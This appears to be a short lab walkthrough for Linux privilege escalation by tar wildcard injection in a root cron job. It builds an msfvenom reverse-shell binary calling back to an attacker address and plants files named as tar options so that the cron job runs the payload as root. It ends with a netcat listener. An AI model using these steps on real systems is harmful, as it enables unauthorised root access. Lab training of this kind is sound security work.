# Cron Jobs - Wildcards

View the contents of the other cron job script:

`cat /usr/local/bin/compress.sh`

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`

Transfer the shell.elf file to **/home/user/** on the Debian VM. Make sure the file is executable:

`chmod +x /home/user/shell.elf`

Create these two files in /home/user:

`touch /home/user/--checkpoint=1`

\
`touch /home/user/--checkpoint-action=exec=shell.elf`

When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.

`nc -nvlp 4444`
